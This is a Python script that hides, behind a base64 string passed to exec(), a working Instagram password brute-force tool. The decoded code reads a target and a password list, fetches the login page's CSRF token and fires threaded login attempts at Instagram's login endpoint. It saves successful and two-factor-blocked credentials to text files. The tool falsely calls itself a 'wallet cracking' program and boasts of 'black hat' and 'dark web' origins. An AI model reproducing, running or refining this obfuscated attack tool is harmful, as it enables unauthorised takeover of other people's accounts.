import marshal,base64
exec (base64.b64decode("IyBhdXRob3IgOiBha2FzaCBibGFjayBoYXQgaGFja2UKIyBkYXJrd2ViIHBsZXllciAxMjcuMC4wLjEKZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBhYnNvbHV0ZV9pbXBvcnQKZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBwcmludF9mdW5jdGlvbgppbXBvcnQgcmVxdWVzdHMsIHN5cywgdGhyZWFkaW5nLCB0aW1lLCBvcywgcmFuZG9tCmZyb20gcmFuZG9tIGltcG9ydCByYW5kaW50CmZyb20gc2l4Lm1vdmVzIGltcG9ydCBpbnB1dAoKQ2hlY2tWZXJzaW9uID0gc3RyKHN5cy52ZXJzaW9uKQppbXBvcnQgcmUKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKCnByaW50KCcnJ1wwMzNbMzJtICAgIArilojilojilZcgICAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZcgICAgIOKWiOKWiOKVlyAgICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4paI4pWXICAgICAgICAgICAgIArilojilojilZEgICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICDilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVkOKWiOKWiOKVlOKVkOKVkOKVnSAgICAgICAgICAgICAK4paI4paI4pWRIOKWiOKVlyDilojilojilZHilojilojilojilojilojilojilojilZHilojilojilZEgICAgIOKWiOKWiOKVkSAgICAg4paI4paI4paI4paI4paI4pWXICAgICDilojilojilZEgICAgICAgICAgICAgICAgCuKWiOKWiOKVkeKWiOKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZ0gICAgIOKWiOKWiOKVkSAgICAgICAgICAgICAgICAK4pWa4paI4paI4paI4pWU4paI4paI4paI4pWU4pWd4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZcgICDilojilojilZEgICAgICAgICAgICAgICAgCiDilZrilZDilZDilZ3ilZrilZDilZDilZ0g4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ0gICDilZrilZDilZ0gICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICDilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWXICDilojilojilZfilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcgICAgIAogICAg4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWRIOKWiOKWiOKVlOKVneKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlyAgICAKICAgIOKWiOKWiOKVkSAgICAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilojilojilojilZTilZ0g4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZTilZ0gICAgCiAgICDilojilojilZEgICAgIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4pWU4pWQ4paI4paI4pWXIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXICAgIAogICAg4pWa4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZEgICAgCiAgICAg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAgIAonJycpCnByaW50KCcnJ1wwMzNbMzFtTm90aWNlIDotPiBNYW5hZ2VtZW50IGRlcGVuZHMgb24geW91ciBkYXJrIHdlYiBhcGkuLi4KWW91ciBhcGkga2V5cyBpcyBlbmNyeXB0ZWQ6ICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKipcMDMzWzMybS4nJycpCmNsYXNzIEluc3RhQnJ1dGUob2JqZWN0KToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKCiAgICAgICAgdHJ5OgogICAgICAgICAgICB1c2VyID0gaW5wdXQoJyBpbnB1dCB0YXJnZXQgd2FsbGV0IGxpbmsgOiAnKQogICAgICAgICAgICBDb21ibyA9IGlucHV0KCdwYXNzTGlzdCA6ICcpCiAgICAgICAgICAgIHByaW50KCdcbmNoYWNrIHBhc3dhcmQgJykKCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgnIFRoZSB0b29sIHdhcyBhcnJlc3RlZCBleGl0ICcpCiAgICAgICAgICAgIHN5cy5leGl0KCkKCiAgICAgICAgd2l0aCBvcGVuKENvbWJvLCAncicpIGFzIHg6CiAgICAgICAgICAgIENvbWJvbGlzdCA9IHgucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgIHRocmVhZCA9IFtdCiAgICAgICAgc2VsZi5Db3V0cHJveCA9IDAKICAgICAgICBmb3IgY29tYm8gaW4gQ29tYm9saXN0OgogICAgICAgICAgICBwYXNzd29yZCA9IGNvbWJvLnNwbGl0KCc6d2FsbGV0IGNyYWNraW5nIHN0YXJ0LS0tLS0+JylbMF0KICAgICAgICAgICAgdCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuTmV3X0JyLCBhcmdzPSh1c2VyLCBwYXNzd29yZCkpCiAgICAgICAgICAgIHQuc3RhcnQoKQogICAgICAgICAgICB0aHJlYWQuYXBwZW5kKHQpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC45KQogICAgICAgIGZvciBqIGluIHRocmVhZDoKICAgICAgICAgICAgai5qb2luKCkKCiAgICBkZWYgY2xzKHNlbGYpOgogICAgICAgIGxpbnV4ID0gJ2NsZWFyJwogICAgICAgIHdpbmRvd3MgPSAnY2xzJwogICAgICAgIG9zLnN5c3RlbShbbGludXgsIHdpbmRvd3NdW29zLm5hbWUgPT0gJ250J10pCgogICAgZGVmIE5ld19CcihzZWxmLCB1c2VyLCBwd2QpOgogICAgICAgIGxpbmsgPSAnaHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9hY2NvdW50cy9sb2dpbi8nCiAgICAgICAgbG9naW5fdXJsID0gJ2h0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vYWNjb3VudHMvbG9naW4vYWpheC8nCgogICAgICAgIHRpbWUgPSBpbnQoZGF0ZXRpbWUubm93KCkudGltZXN0YW1wKCkpCgogICAgICAgIHBheWxvYWQgPSB7CiAgICAgICAgICAgICd1c2VybmFtZSc6IHVzZXIsCiAgICAgICAgICAgICdlbmNfcGFzc3dvcmQnOiBmJyNQV0RfSU5TVEFHUkFNX0JST1dTRVI6MDp7dGltZX06e3B3ZH0nLAogICAgICAgICAgICAncXVlcnlQYXJhbXMnOiB7fSwKICAgICAgICAgICAgJ29wdEludG9PbmVUYXAnOiAnZmFsc2UnCiAgICAgICAgfQoKICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBzOgogICAgICAgICAgICByID0gcy5nZXQobGluaykKICAgICAgICAgICAgY3NyZiA9IHJlLmZpbmRhbGwociJjc3JmX3Rva2VuXCI6XCIoLio/KVwiIiwgci50ZXh0KVswXQogICAgICAgICAgICByID0gcy5wb3N0KGxvZ2luX3VybCwgZGF0YT1wYXlsb2FkLCBoZWFkZXJzPXsKICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzc3LjAuMzg2NS4xMjAgU2FmYXJpLzUzNy4zNiIsCiAgICAgICAgICAgICAgICAiWC1SZXF1ZXN0ZWQtV2l0aCI6ICJYTUxIdHRwUmVxdWVzdCIsCiAgICAgICAgICAgICAgICAiUmVmZXJlciI6ICJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FjY291bnRzL2xvZ2luLyIsCiAgICAgICAgICAgICAgICAieC1jc3JmdG9rZW4iOiBjc3JmCiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIHByaW50KGYne3VzZXJ9Ontwd2R9XG4gLi4ud2FsbGV0IGNyYWNraW5nIHN0YXJ0Li4uJykKCiAgICAgICAgICAgIGlmICdhdXRoZW50aWNhdGVkIjogdHJ1ZScgaW4gci50ZXh0OgogICAgICAgICAgICAgICAgcHJpbnQoKCcnICsgdXNlciArICc6QXR0YWNrIHBhc3dvcmQgc3RhcnQtLS0tLT4nICsgcHdkICsgJyAtLT4gR29vZCBoYWNrICcpKQogICAgICAgICAgICAgICAgd2l0aCBvcGVuKCdnb29kLnR4dCcsICdhJykgYXMgeDoKICAgICAgICAgICAgICAgICAgICB4LndyaXRlKHVzZXIgKyAnOicgKyBwd2QgKyAnXG4nKQogICAgICAgICAgICBlbGlmICd0d29fZmFjdG9yX3JlcXVpcmVkJyBpbiByLnRleHQ6CiAgICAgICAgICAgICAgICBwcmludCgoJycgKyB1c2VyICsgJzonICsgcHdkICsgJyAtLT4gIEdvb2QgSXQgaGFzIHRvIGJlIGNoZWNrZWQgJykpCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oJ3Jlc3VsdHNfTmVlZFZlcmZpeS50eHQnLCAnYScpIGFzIHg6CiAgICAgICAgICAgICAgICAgICAgeC53cml0ZSh1c2VyICsgJzonICsgcHdkICsgJ1xuJykKCgpJbnN0YUJydXRlKCk= "))